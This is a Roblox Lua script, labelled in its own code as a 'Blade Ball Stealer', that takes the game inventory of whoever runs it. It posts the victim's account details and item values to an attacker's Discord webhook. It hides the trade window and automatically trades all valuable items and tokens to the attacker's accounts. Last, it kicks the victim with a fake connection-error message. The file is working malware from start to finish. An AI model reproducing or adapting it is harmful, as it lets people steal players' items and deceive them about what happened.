_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- Détection de l'exécuteur pour l'envoi HTTP
local http_request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

if not webhook or webhook == "" then
    return
end

-- Masquer le trade (Ton code original)
tradeGui.Black.Visible = false
local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function() maintradegui.Visible = false end)

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
end)

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- FONCTION ENVOI CORRIGÉE
local function SendJoinMessage(list, totalRAPVal)
    local executorName = identifyexecutor and identifyexecutor() or "Unknown"
    local browserJoin = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
    local joinCode = "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')"
    
    local tokens = "0"
    pcall(function()
        tokens = PlayerGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")
    end)

    local itemSummary = ""
    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = (grouped[item.Name] or 0) + 1
    end
    for name, count in pairs(grouped) do
        itemSummary = itemSummary .. name .. " (x" .. count .. ")\n"
    end

    local data = {
        ["content"] = (ping == "Yes" and "||​|| @everyone" or "") .. "\n`" .. joinCode .. "`",
        ["embeds"] = {{
            ["title"] = "🟡 Pending Hit ... | ⚔️ Blade Ball Stealer",
            ["color"] = 16763904,
            ["fields"] = {
                {
                    ["name"] = "ℹ️ Player info:",
                    ["value"] = "```" ..
                        "\n🆔 Username      : " .. plr.Name ..
                        "\n👤 Display Name  : " .. plr.DisplayName ..
                        "\n🗓️ Account Age   : " .. plr.AccountAge .. " Days" ..
                        "\n⚡ Executor      : " .. executorName ..
                        "\n🎮 Server        : " .. #Players:GetPlayers() .. "/15" ..
                        "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "🎯 Inventory:",
                    ["value"] = "```" ..
                        "\n💰 Total Value: " .. formatNumber(totalRAPVal) .. " RAP" ..
                        "\n🪙 Tokens: " .. formatNumber(tonumber(tokens)) ..
                        "\n\n" .. itemSummary ..
                        "```",
                    ["inline"] = false
                },
                {["name"] = "🔗 Join Server", ["value"] = "[Click to join game]("..browserJoin..")", ["inline"] = true},
                {["name"] = "📜 Full Inventory", ["value"] = "[Click to show](https://www.roblox.com/users/"..plr.UserId.."/inventory)", ["inline"] = true}
            },
            ["footer"] = {["text"] = "by Eblack • " .. os.date("%B %d, %Y")},
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"}
        }}
    }

    if http_request then
        http_request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end
end

-- Scan Inventaire (Ton code original)
local rapDataResult = Replion.Client:GetReplion("ItemRAP")
local rapData = rapDataResult.Data.Items

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    if not rapData[category] then return nameToRAP end
    for k, v in pairs(rapData[category]) do
        local success, decoded = pcall(function() return HttpService:JSONDecode(k) end)
        if success then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" then nameToRAP[pair[2]] = v break end
            end
        end
    end
    return nameToRAP
end

local totalRAP = 0
for _, cat in ipairs(categories) do
    local map = buildNameToRAPMap(cat)
    for id, info in pairs(clientInventory[cat]) do
        if not info.TradeLock then
            local rap = map[info.Name] or 0
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
            end
        end
    end
end

-- Lancement
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    SendJoinMessage(itemsToSend, totalRAP)

    local function doTrade(targetName)
        while #itemsToSend > 0 do
            pcall(function() netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(Players:WaitForChild(targetName)) end)
            repeat task.wait(0.5) until inTrade
            
            local batch = 0
            while #itemsToSend > 0 and batch < 100 do
                local item = table.remove(itemsToSend, 1)
                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                batch = batch + 1
            end
            
            local rawText = PlayerGui.Main.Currency.Coins.Amount.Text
            local tokens = tonumber(rawText:gsub("[^%d]", "")) or 0
            if tokens >= 1 then
                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens)
            end
            
            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            repeat task.wait(0.2) until not inTrade
        end
        plr:kick("Please check your internet connection and try again. (Error Code: 277)")
    end

    -- Détection de ton compte pour recevoir
    for _, p in ipairs(Players:GetPlayers()) do
        if table.find(users, p.Name) then doTrade(p.Name) break end
    end
end
